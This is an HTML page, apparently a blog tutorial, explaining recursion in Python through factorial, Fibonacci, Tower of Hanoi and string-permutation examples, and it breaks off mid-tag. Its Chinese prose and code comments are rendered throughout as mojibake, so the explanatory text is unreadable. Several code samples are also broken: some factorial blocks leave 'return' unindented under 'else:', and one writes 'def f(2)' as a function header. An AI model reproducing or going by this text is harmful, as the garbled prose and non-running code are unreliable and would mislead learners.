ä¸€ä¸‹å¦‚ä½•ä½¿ç”¨é€’å½’ç®—æ³•ã€‚</p><p>**é€’å½’ç®—æ³• ** é€šå¸¸ç”¨æ¥è§£å†³ç»“æ„è‡ªç›¸ä¼¼çš„é—®é¢˜ã€‚æ‰€è°“ç»“æ„è‡ªç›¸ä¼¼ï¼Œæ˜¯æŒ‡æ„æˆåŸé—®é¢˜çš„å­é—®é¢˜ä¸åŸé—®é¢˜åœ¨ç»“æ„ä¸Šç›¸ä¼¼ï¼Œå¯ä»¥ç”¨ç±»ä¼¼çš„æ–¹æ³•è§£å†³ã€‚è€Œåœ¨ä½¿ç”¨é€’å½’æ—¶ï¼Œåˆ™æ˜¯é€šè¿‡å°†é—®é¢˜åˆ†è§£æˆç›¸åŒç±»å‹çš„å­é—®é¢˜ï¼Œç„¶åå†é€šè¿‡å­é—®é¢˜çš„ç»“æœå†åæ¨å‡ºé—®é¢˜çš„ç»“æœã€‚</p><p><strong>é€’å½’ç®—æ³•</strong> çš„ä¸‰æ­¥ï¼š</p><ol><li>é€’å½’å‡½æ•°çš„å‚æ•°ä»¥åŠè¿”å›å€¼</li><li>ç¡®å®šç»ˆæ­¢æ¡ä»¶</li><li>å•å±‚é€’å½’çš„é€»è¾‘</li></ol><h3 id="ä¸¾ä¾‹"><a href="#ä¸¾ä¾‹" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h3><h4 id="ä¸¾ä¾‹1ï¼šnçš„é˜¶ä¹˜"><a href="#ä¸¾ä¾‹1ï¼šnçš„é˜¶ä¹˜" class="headerlink" title="ä¸¾ä¾‹1ï¼šnçš„é˜¶ä¹˜"></a>ä¸¾ä¾‹1ï¼šnçš„é˜¶ä¹˜</h4><p>å…ˆå¯¹nçš„é˜¶ä¹˜è¿›è¡Œåˆ†æ</p><p><code>n! = n * (n-1) * (n-2) * Â·Â·Â·Â·Â·Â·* 2 * 1</code>ï¼Œç›¸å½“äºä¸‹å¼</p><p><img src="/2022/01/22/recursion/1.png" alt="img"></p><p>å‡è®¾n=1ï¼Œåˆ™nçš„é˜¶ä¹˜ç­‰äº1ï¼›n=2æ—¶ï¼Œnçš„é˜¶ä¹˜ç­‰äº2*1=2</p><p>é¦–å…ˆç¡®å®šé€’å½’å‡½æ•°çš„å‚æ•°ä»¥åŠè¿”å›å€¼ï¼Œæ—¢ç„¶æ˜¯nçš„é˜¶ä¹˜ï¼Œé‚£å‚æ•°è‚¯å®šæ¯«æ— ç–‘é—®æ˜¯n(é€’å½’å‡½æ•°çš„å‚æ•°ï¼Œå¦‚æœåˆšå¼€å§‹ä¸èƒ½ç¡®å®šæ‰€æœ‰ï¼Œåˆ™å¯ä»¥åœ¨åç»­è¿›è¡Œè¡¥å……ï¼Œä¸å½±å“çš„ã€‚)ï¼Œå†è¯´è¿”å›å€¼ï¼Œæ±‚nçš„é˜¶ä¹˜ï¼Œè¿”å›å€¼æŒ‡å®šæ˜¯é˜¶ä¹˜çš„ç»“æœ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#æ±‚nçš„é˜¶ä¹˜</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">return</span> n!<br></code></pre></td></tr></table></figure><p>ç¡®å®šç»ˆæ­¢æ¡ä»¶ï¼Œå·²çŸ¥<code>1!</code>== 1ï¼Œåˆ™å¯ä»¥ç¡®å®šå½“n==1æ—¶ï¼Œè¿™ä¸ªé€’å½’å°±å¯ä»¥ç»ˆæ­¢äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> n!<br></code></pre></td></tr></table></figure><p>ç¡®å®šå•å±‚é€’å½’çš„é€»è¾‘ï¼Œå·²çŸ¥<code>n! = n * (n-1) * (n-2) * Â·Â·Â·Â·Â·Â·* 2 * 1</code>ï¼Œä½¿ç”¨f(n)æ¥è¡¨ç¤ºnçš„é˜¶ä¹˜ï¼Œ<code>f(n)==n*f(n-1)</code>ï¼Œå½“n-1ç­‰äº1æ—¶ï¼Œåˆ™å¯ä»¥ç›´æ¥è¿”å›å·²çŸ¥çš„ç»“æœã€‚åˆ™å‡½æ•°å°±å¯ä»¥å†™æˆå¦‚ä¸‹å½¢å¼:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> n*f(n-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>è¦æ˜¯æ²¡ç†è§£ï¼Œå…ˆå‡è®¾n=2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params"><span class="hljs-number">2</span></span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>*f(<span class="hljs-number">2</span>-<span class="hljs-number">1</span>)<span class="hljs-comment">#å·²çŸ¥f(1)==1ï¼Œåˆ™ç›¸å½“äºç›´æ¥return 2*1</span><br></code></pre></td></tr></table></figure><p>å†çœ‹n=3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params"><span class="hljs-number">3</span></span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>*f(<span class="hljs-number">3</span>-<span class="hljs-number">1</span>)<span class="hljs-comment">#return 3*f(2),è°ƒç”¨f()ï¼Œæ±‚f(2),ä¹Ÿå°±å†è¿”å›åˆ°ä¸Šé¢çš„å¼å­ä¸­</span><br></code></pre></td></tr></table></figure><p>å†å‡è®¾n=5ï¼Œåˆ™å‡½æ•°å…·ä½“çš„æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">f(<span class="hljs-number">5</span>)<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*f(<span class="hljs-number">4</span>)<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*f(<span class="hljs-number">3</span>))<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*(<span class="hljs-number">3</span>*f(<span class="hljs-number">2</span>)))<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*(<span class="hljs-number">3</span>*(<span class="hljs-number">2</span>*f(<span class="hljs-number">1</span>))))<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*((<span class="hljs-number">5</span>-<span class="hljs-number">1</span>)*((<span class="hljs-number">5</span>-<span class="hljs-number">2</span>)*((<span class="hljs-number">5</span>-<span class="hljs-number">3</span>)*f(<span class="hljs-number">5</span>-<span class="hljs-number">4</span>))))<span class="hljs-comment">#ä¸ŠåŠéƒ¨åˆ†ä¸ºé€’ï¼Œä¸‹åŠéƒ¨åˆ†ä¸ºå½’</span><br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*((<span class="hljs-number">5</span>-<span class="hljs-number">1</span>)*((<span class="hljs-number">5</span>-<span class="hljs-number">2</span>)*((<span class="hljs-number">5</span>-<span class="hljs-number">3</span>)*<span class="hljs-number">1</span>)))<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*((<span class="hljs-number">5</span>-<span class="hljs-number">1</span>)*((<span class="hljs-number">5</span>-<span class="hljs-number">2</span>)*(<span class="hljs-number">2</span>))<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*((<span class="hljs-number">5</span>-<span class="hljs-number">1</span>)*(<span class="hljs-number">6</span>)<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*(<span class="hljs-number">24</span>)<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">120</span><br></code></pre></td></tr></table></figure><p>åˆ™å¯ä»¥å¾—å‡ºæœ€ç»ˆç¨‹åºï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> n*f(n-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h4 id="ä¸¾ä¾‹2ï¼šæ–æ³¢é‚£å¥‘æ•°åˆ—"><a href="#ä¸¾ä¾‹2ï¼šæ–æ³¢é‚£å¥‘æ•°åˆ—" class="headerlink" title="ä¸¾ä¾‹2ï¼šæ–æ³¢é‚£å¥‘æ•°åˆ—"></a>ä¸¾ä¾‹2ï¼šæ–æ³¢é‚£å¥‘æ•°åˆ—</h4><p>1ã€1ã€2ã€3ã€5ã€8ã€13ã€21ã€34Â·Â·Â·Â·Â·Â·Â·  ç®€å•ç‚¹è¯´å°±æ˜¯ç¬¬né¡¹çš„å€¼ä¸ºå‰ä¸¤é¡¹ä¹‹å’Œ</p><p>é¦–å…ˆå¯¹è¯¥æ•°åˆ—è¿›è¡Œåˆ†æï¼Œç”±äºç¬¬ä¸€é¡¹å’Œç¬¬äºŒé¡¹æ²¡æœ‰å‰ä¸¤é¡¹ï¼Œåˆ™å¯ä»¥çŸ¥é“å…¶å€¼ç›´æ¥ä¸º1ï¼Œå‡è®¾f(n)ä¸ºç¬¬né¡¹çš„å€¼ï¼Œåˆ™å¯ä»¥æ¨å‡ºä¸‹å¼ï¼š</p><p><img src="/2022/01/22/recursion/2.png" alt="img"></p><p>å…ˆç¡®å®šå‡½æ•°çš„å‚æ•°ã€è¿”å›å€¼ï¼Œæ±‚ç¬¬né¡¹çš„å€¼ï¼Œåˆ™næ¯«æ— ç–‘é—®æ˜¯å‚æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">return</span> s <span class="hljs-comment"># å‡è®¾sæ˜¯ç¬¬né¡¹çš„å€¼</span><br></code></pre></td></tr></table></figure><p>ç¡®å®šç»ˆæ­¢æ¡ä»¶ï¼Œå·²çŸ¥n=1æˆ–è€…n=2æ—¶ï¼Œå…¶å€¼ä¸º1ï¼Œåˆ™å¯ä»¥ç¡®å®šå½“n=1æˆ–è€…n=2æ—¶é€’å½’å°±å¯ä»¥ç»“æŸäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span>(n==<span class="hljs-number">2</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> s<span class="hljs-comment"># å‡è®¾sæ˜¯ç¬¬né¡¹çš„å€¼</span><br></code></pre></td></tr></table></figure><p>ç¡®å®šå•å±‚å‡½æ•°çš„é€»è¾‘ï¼Œå…ˆå‡è®¾n=3ï¼Œåˆ™ç¬¬ä¸‰é¡¹çš„å€¼<code>f(3)=f(2)+f(1)</code>ï¼Œä¹Ÿå°±ç›¸å½“äº<code>f(n)=f(n-1)+f(n-2)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span>(n==<span class="hljs-number">2</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> f(n-<span class="hljs-number">1</span>)+f(n-<span class="hljs-number">2</span>)<span class="hljs-comment"># å®Œå·¥</span><br></code></pre></td></tr></table></figure><h4 id="ä¸¾ä¾‹-3-æ±‰è¯ºå¡”"><a href="#ä¸¾ä¾‹-3-æ±‰è¯ºå¡”" class="headerlink" title="ä¸¾ä¾‹ 3 æ±‰è¯ºå¡”"></a>ä¸¾ä¾‹ 3 æ±‰è¯ºå¡”</h4><p>æ±‚æ±‰è¯ºå¡”çš„æŒªåŠ¨é¡ºåº(ä¸æ˜¯éœ€è¦æŒªåŠ¨çš„æ¬¡æ•°)</p><p>å…·ä½“ç©æ³•è¿™å°±ä¸å•°å—¦äº†ï¼Œåæ­£å°±æ˜¯æŠŠä¸€å †åœ†ç‰‡ç‰‡ä»ä¸€ä¸ªæŸ±å­ä¸Šé¢æŒªåˆ°å¦å¤–ä¸€ä¸ªæŸ±å­ä¸Šé¢ï¼Œå”¯ä¸€çš„è¦æ±‚å°±æ˜¯å°çš„è¦åœ¨å¤§çš„ä¸Šé¢ã€‚</p><p>å‡è®¾åœ†ç‰‡ç‰‡çš„æ•°é‡ä¸ºn,åˆ™å½“n=1æ—¶ï¼Œå¯ä»¥ç›´æ¥å°†Aç§»åŠ¨åˆ°CæŸ±ä¸Šï¼Œ</p><p><img src="/2022/01/22/recursion/tower1.gif"></p><p>å½“n=2æ—¶ï¼Œå…·ä½“æŒªåŠ¨çŠ¶æ€å¦‚ä¸‹:</p><p>A â€“&gt; B</p><p>A â€“&gt; C</p><p>B â€“&gt; C</p><p><img src="/2022/01/22/recursion/tower2.gif"></p><p>å½“n=3æ—¶</p><p>A â€“&gt; C</p><p>A â€“&gt; B</p><p>C â€“&gt; B</p><p>A â€“&gt; C</p><p>B â€“&gt; A</p><p>B â€“&gt; C</p><p>A â€“&gt; C</p><p><img src="/2022/01/22/recursion/tower3.gif"></p><p>ä¸éš¾çœ‹å‡ºï¼Œå½“n=2æ—¶ï¼Œä¸»è¦å°±æ˜¯åˆ†ä¸‰æ­¥(å¯¹åœ†ç‰‡è¿›è¡Œæ ‡å·ï¼Œä»ä¸‹å¾€ä¸Šï¼ŒN-&gt;1)</p><p>1ã€1(N-1)å·åœ†ç‰‡ä»èµ·å§‹ä½ç½®ç§»åŠ¨åˆ°ç¼“å†²åŒº</p><p>2ã€å°†2(N)å·åœ†ç‰‡ä»èµ·å§‹ä½ç½®ç§»åŠ¨åˆ°ç»ˆç‚¹</p><p>3ã€æœ€åå°†1(N-1)å·åœ†ç‰‡ä»ç¼“å†²åŒºç§»åŠ¨åˆ°ç»ˆç‚¹</p><p>å½“ç„¶ï¼Œåœ¨åœ†ç‰‡æ•°é‡è¾ƒå¤šæ—¶çš„èµ·å§‹ä½ç½®ï¼Œç»ˆç‚¹ä¸ç¼“å†²åŒºæ˜¯ç›¸å¯¹çš„ï¼Œå¹¶ä¸æ˜¯æŒ‡å®šçš„æŸä¸€ä¸ªæŸ±å­ï¼Œå› ä¸ºéœ€è¦ä¸åœçš„äº¤æ¢ä½ç½®ï¼Œæ‰€ä»¥èµ·å§‹ä½ç½®ã€ç¼“å†²åŒºä¸ç»ˆç‚¹å¯ä»¥æ˜¯ä»»ä½•ä¸€ä¸ªæŸ±å­ã€‚</p><p>å…ˆå‡è®¾åªæœ‰ä¸¤ä¸ªåœ†ç‰‡ï¼Œä¹Ÿå°±æ˜¯n=2(è¦å…ˆå°†æœ€å°å­é—®é¢˜æ±‚å‡º)æŒ‰ç…§é€’å½’ä¸‰æ­¥ï¼Œé¦–å…ˆç¡®å®šå‚æ•°ä»¥åŠè¿”å›å€¼ï¼Œnä¸ªåœ†ç‰‡(n)ï¼Œèµ·å§‹æŸ±å­(A)ï¼Œç¼“å†²æŸ±å­(B)ï¼Œç»ˆæ­¢ä½ç½®(C)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tower</span>(<span class="hljs-params">n,A,B,C</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;åœ†ç‰‡çš„å˜åŠ¨æƒ…å†µ&quot;</span>)<br></code></pre></td></tr></table></figure><p>ç¡®å®šç»ˆæ­¢æ¡ä»¶ï¼Œå·²çŸ¥å½“åªæœ‰ä¸€ä¸ªåœ†ç‰‡æ—¶ï¼Œå¯ä»¥ç›´æ¥ä»èµ·å§‹ä½ç½®ç›´æ¥åˆ°ç»ˆæ­¢ä½ç½®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tower</span>(<span class="hljs-params">n,A,B,C</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;åœ†ç‰‡çš„å˜åŠ¨æƒ…å†µ&quot;</span>)<br></code></pre></td></tr></table></figure><p>ç¡®å®šå•å±‚å¾ªç¯çš„é€»è¾‘ï¼Œå•å±‚çš„é€»è¾‘åœ¨ä¸Šé¢å·²ç»å†™æ¸…æ¥šï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥å†™å‡º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># n = 2çš„æƒ…å†µä¸‹</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tower</span>(<span class="hljs-params">n,A,B,C</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+B)<br>        <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<br>        <span class="hljs-built_in">print</span>(B +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<br></code></pre></td></tr></table></figure><p>è€Œå½“n=3æ—¶ï¼Œå°±è¦ç»§ç»­è°ƒç”¨tower()è¿›è¡Œæ’åˆ—ï¼Œæ‰€ä»¥å¯ä»¥å†™æˆå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å†å‡è®¾n = 3çš„æƒ…å†µä¸‹</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tower</span>(<span class="hljs-params">n,A,B,C</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<br>    <span class="hljs-keyword">else</span>:<br>        tower(n-<span class="hljs-number">1</span>,A,C,B) <span class="hljs-comment">#å› ä¸ºç°åœ¨æ˜¯å°†åœ†ç‰‡ä»Aç§»åŠ¨åˆ°Bï¼Œæ‰€ä»¥Bå’ŒCè°ƒæ¢ä½ç½®</span><br>        <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<span class="hljs-comment"># å¯ä»¥å‡è®¾1å·åœ†ç‰‡ä¸Šé¢çš„æŸ±å­éƒ½å·²ç»ç§»åŠ¨åˆ°äº†ç¼“å†²åŒºï¼Œåˆ™å¯ä»¥ç›´æ¥A-&gt;C</span><br>        tower(n-<span class="hljs-number">1</span>,B,A,C) <span class="hljs-comment"># ç°åœ¨å°†ç¼“å†²åŒºä¸Šçš„åœ†ç‰‡ç§»åŠ¨è‡³ç»ˆç‚¹</span><br></code></pre></td></tr></table></figure><p>n&gt;1çš„å…¶ä»–æƒ…å†µåŒç†</p><h4 id="ä¸¾ä¾‹4-å­—ç¬¦ä¸²çš„å…¨æ’åˆ—"><a href="#ä¸¾ä¾‹4-å­—ç¬¦ä¸²çš„å…¨æ’åˆ—" class="headerlink" title="ä¸¾ä¾‹4 å­—ç¬¦ä¸²çš„å…¨æ’åˆ—"></a>ä¸¾ä¾‹4 å­—ç¬¦ä¸²çš„å…¨æ’åˆ—</h4><p>å°±æ˜¯å°†å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰å­—ç¬¦è¿›è¡Œæ’åˆ—ç»„åˆï¼Œå¾—åˆ°æ‰€æœ‰çš„æ’åˆ—ç»„åˆç»“æœï¼Œå¹¶å»é‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ä¾‹é¢˜</span><br><span class="hljs-comment"># é¢˜ç›®æ¥æºï¼šcodewars.Permutations</span><br>permutations(<span class="hljs-string">&#x27;a&#x27;</span>); <span class="hljs-comment"># [&#x27;a&#x27;]</span><br>permutations(<span class="hljs-string">&#x27;ab&#x27;</span>); <span class="hljs-comment"># [&#x27;ab&#x27;, &#x27;ba&#x27;]</span><br>permutations(<span class="hljs-string">&#x27;aabb&#x27;</span>); <span class="hljs-comment"># [&#x27;aabb&#x27;, &#x27;abab&#x27;, &#x27;abba&#x27;, &#x27;baab&#x27;, &#x27;baba&#x27;, &#x27;bbaa&#x27;]</span><br></code></pre></td></tr></table></figure><p>é¢˜ç›®çš„æ„æ€å¾ˆå¥½ç†è§£ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä¸Šé€’å½’</p><p>ç¡®å®šé€’å½’çš„å‚æ•°åŠè¿”å›å€¼ï¼Œæ˜¯å¯¹å­—ç¬¦ä¸²çš„å…¨æ’åˆ—ï¼Œæ‰€ä»¥å­—ç¬¦ä¸²ä¸€å®šæ˜¯å‚æ•°ï¼Œè¿”å›å€¼åˆ™æ˜¯æ’åˆ—ç»„åˆçš„ç»“æœï¼Œå¹¶ä¸”è¦å»é‡ï¼Œåˆ™å¯ä»¥ç”¨ä¸€ä¸ªæ•°ç»„åœ¨åŠ ä¸Šset()å»é‡å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">permutations</span>(<span class="hljs-params">string</span>):</span><br>    result = [] <span class="hljs-comment"># å­˜æ”¾æ’åˆ—ç»„åˆçš„ç»“æœ</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>(result)<br></code></pre></td></tr></table></figure><p>ç¡®å®šé€’å½’çš„ç»“æŸç‚¹ï¼Œç”±ä¾‹å­å¯çŸ¥ï¼Œå½“å­—ç¬¦ä¸²ä¸­åªæœ‰ä¸€ä¸ªå­—æ¯æ—¶ï¼Œç»“æœåªæœ‰ä¸€ä¸ª(å®ƒè‡ªå·±æœ¬èº«)ï¼Œæ­¤æ—¶å¯ä»¥ç›´æ¥è¿”å›</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">permutations</span>(<span class="hljs-params">string</span>):</span><br>    result = [] <span class="hljs-comment"># å­˜æ”¾æ’åˆ—ç»„åˆçš„ç»“æœ</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(string)==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> string<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>(result)<br></code></pre></td></tr></table></figure><p>ç¡®å®šå•å±‚é€’å½’é€»è¾‘ï¼Œå¯ä»¥å…ˆå‡è®¾å­—ç¬¦ä¸²ä¸ºâ€abâ€,è¿™ä¸ªç®—æ˜¯å…¨æ’åˆ—ä¸­æœ€å°å­é—®é¢˜äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å­—ç¬¦ä¸²é•¿åº¦ä¸º2æ—¶</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">permutations</span>(<span class="hljs-params">string</span>):</span><br>    result = [] <span class="hljs-comment"># å­˜æ”¾æ’åˆ—ç»„åˆçš„ç»“æœ</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(string)==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> string<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(string)):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> string[:i]+string[i+<span class="hljs-number">1</span>:]: <span class="hljs-comment"># å…¨æ’åˆ—çš„æƒ…å†µä¸‹,ä¸èƒ½ä¸è‡ªèº«è¿›è¡Œæ’åˆ—ç»„åˆ</span><br>            <span class="hljs-comment"># ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨&quot;ab&quot;çš„æƒ…å†µä¸‹ï¼Œé€‰å–&quot;a&quot;ä¹‹åå°±ä¸èƒ½å†é€‰å–äº†ï¼Œå½“ç„¶&quot;aab&quot;çš„æƒ…å†µä¸‹ï¼Œaå¯ä»¥å‡ºç°ä¸¤æ¬¡</span><br>            result.append(string[i]+j)<br>        <span class="hljs-keyword">return</span> <span 